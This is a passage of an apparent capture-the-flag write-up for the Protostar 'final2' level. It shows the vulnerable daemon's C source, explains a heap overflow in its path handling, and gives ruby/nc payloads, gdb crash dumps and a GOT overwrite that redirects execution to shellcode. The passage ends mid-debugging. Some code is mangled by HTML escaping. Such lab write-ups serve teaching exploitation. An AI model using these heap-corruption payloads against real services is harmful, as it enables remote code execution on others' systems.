</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">*</span> <span class="n">Work</span> <span class="n">out</span> <span class="n">old</span> <span class="n">software</span> <span class="n">bug</span>
</span><span class='line'>  <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">ROOT</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="n">start</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;;</span>
</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">moving</span> <span class="n">from</span> <span class="o">%</span><span class="n">p</span> <span class="n">to</span> <span class="o">%</span><span class="n">p</span> <span class="p">(</span><span class="nl">exploit</span><span class="p">:</span> <span class="o">%</span><span class="n">s</span> <span class="o">/</span> <span class="o">%</span><span class="n">d</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">yes</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">:</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">no</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Process</span> <span class="n">OK</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Process</span> <span class="n">OK</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;));</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The vulnerability is in this part of the source:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">ROOT</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="n">start</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;;</span>
</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">moving</span> <span class="n">from</span> <span class="o">%</span><span class="n">p</span> <span class="n">to</span> <span class="o">%</span><span class="n">p</span> <span class="p">(</span><span class="nl">exploit</span><span class="p">:</span> <span class="o">%</span><span class="n">s</span> <span class="o">/</span> <span class="o">%</span><span class="n">d</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">yes</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">:</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">no</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>It expects message with the content <code>..../..ROOT.../next</code>, look for the rightmost <code>/</code>,
then searching for string <code>ROOT</code> and going leftside, it finds another <code>/</code>.</p>

<p>Finally, it copies <code>/next</code> after the left <code>/</code>, before <code>ROOT</code> and creates <code>..../next\x00T...</code></p>

<p>We need at least one slash, because <code>strlen(NULL)</code> segfaults. The security issue
is that if we don&rsquo;t set left slash, it continues to the left through different
chunk, for example:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1st chunk: &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 + &ldquo;/&rdquo;
</span><span class='line'>2nd chunk: &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 103
</span><span class='line'>3rd chunk: &ldquo;XXXX&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>In this case we copy everything after <code>ROOT/</code> to the 1st chunk and overwrite the chunk metadata, so we have classic heap overflow.</p>

<p>To verify our concept, we attach to the final2 process as root user:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 +&ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>[New process 2405]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 2405]
</span><span class='line'>_______________________________________Current language:  auto
</span><span class='line'>The current source language is &ldquo;auto; currently c&rdquo;.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:41414141 ebx:B7FD7FF4  ecx:0804C2D6  edx:42424242     eflags:00010246
</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF7E0  ebp:BFFFF828     eip:0804AAEF
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF7E0]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF810 : 42 42 42 42  41 41 41 41 - 18 E1 04 08  18 E1 04 08 BBBBAAAA&hellip;&hellip;..
</span><span class='line'>BFFFF800 : 88 E0 04 08  FC FF FF FF - 00 00 00 00  10 E1 04 08 &hellip;&hellip;&hellip;&hellip;&hellip;.
</span><span class='line'>BFFFF7F0 : 00 D5 04 08  00 E0 04 08 - 88 00 00 00  45 BD 04 08 &hellip;&hellip;&hellip;&hellip;E&hellip;
</span><span class='line'>BFFFF7E0 : 00 00 00 00  00 00 00 00 - 28 F8 FF BF  68 B5 04 08 &hellip;&hellip;..(&hellip;h&hellip;
</span><span class='line'>[007B:41414141]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>41414141 : Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x41414141
</span><span class='line'>0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
</span><span class='line'>3648    final2/../common/malloc.c: No such file or directory.
</span><span class='line'>    in final2/../common/malloc.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> i r eax edx
</span><span class='line'>eax            0x41414141   0x41414141
</span><span class='line'>edx            0x42424242   0x42424242&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /i $eip
</span><span class='line'>0x804aaef &lt;free+301>:   mov    DWORD PTR [eax+0xc],edx&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /50x 0x804e010
</span><span class='line'>0x804e010:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e020:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e030:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e040:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e050:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e060:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e070:  0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e080:  0x30303030  0x2f303030  0xfffffff8  0xfffffffc
</span><span class='line'>0x804e090:  0x41414141  0x42424242  0x58585858  0x58585858
</span><span class='line'>0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0d0:  0x58585858  0x58585858&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>We use <code>GOT</code> technique, modifing <code>write</code> and the shellcode will be stored in our first chunk (<code>0x804e010</code>).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -TR /opt/protostar/bin/final2 | grep &ldquo;R_386_JUMP_SLOT.* write&rdquo;
</span><span class='line'>0804d41c R_386_JUMP_SLOT   write&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) print /x 0x0804d41c-0x0c
</span><span class='line'>$1 = 0x804d410</span></code></pre></td></tr></table></div></figure></p>

<p>So we need to write <code>0x804e010</code> to <code>0x804d41c</code>.</p>

<p>To check where are usable data in our buffer, we use metasploit pattern:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 2427]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:B7FFEFF4 ebx:B7FE1848  ecx:FFFFFFFF  edx:0013F1CC     eflags:00010286
</span><span class='line'> esi:BFFFF91C edi:00000001  esp:BFFFF8AC  ebp:B7FEBFC6     eip:0804E026
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF8AC]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF8DC : FA 90 04 08  FC F8 FF BF - 05 00 00 00  00 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
</span><span class='line'>BFFFF8CC : 11 00 20 01  00 00 00 00 - 28 67 E9 B7  08 F9 FF BF .. &hellip;..(g&hellip;&hellip;
</span><span class='line'>BFFFF8BC : B0 FA FF B7  A7 D8 F2 B7 - 01 00 00 00  01 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
</span><span class='line'>BFFFF8AC : E7 88 04 08  01 00 00 00 - F0 F8 FF BF  26 06 FF B7 &hellip;&hellip;&hellip;&hellip;&amp;&hellip;
</span><span class='line'>[007B:BFFFF91C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>BFFFF91C : 7B 00 00 00  7B 00 00 00 - 28 67 E9 B7  00 00 00 00 {&hellip;{&hellip;(g&hellip;&hellip;
</span><span class='line'>BFFFF92C : 18 FC FF BF  EC FB FF BF - 11 00 20 01  00 00 00 00 &hellip;&hellip;&hellip;. &hellip;..
</span><span class='line'>[0073:0804E026]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
</span><span class='line'>0x804e026:  cmp    BYTE PTR [ecx+0x61],al
</span><span class='line'>0x804e029:  cmp    DWORD PTR [ecx+0x62],eax
</span><span class='line'>0x804e02c:  xor    BYTE PTR [ecx+0x62],al
</span><span class='line'>0x804e02f:  xor    DWORD PTR [ecx+0x62],eax
</span><span class='line'>0x804e032:  xor    al,BYTE PTR [ecx+0x62]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>0x804e035:  xor    eax,DWORD PTR [ecx+0x62]&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>0x0804e026 in ?? ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /50x 0x804e010
</span><span class='line'>0x804e010:  0x61413161  0x33614132  0x0804d410  0x61413561
</span><span class='line'>0x804e020:  0x37614136  0x41386141  0x62413961  0x31624130
</span><span class='line'>0x804e030:  0x41326241  0x62413362  0x35624134  0x41367241
</span><span class='line'>0x804e040:  0x62413762  0x39624138  0x41306341  0x63413163
</span><span class='line'>0x804e050:  0x33634132  0x41346341  0x63413563  0x37634136
</span><span class='line'>0x804e060:  0x41386341  0x64413963  0x3584d130  0x41326449
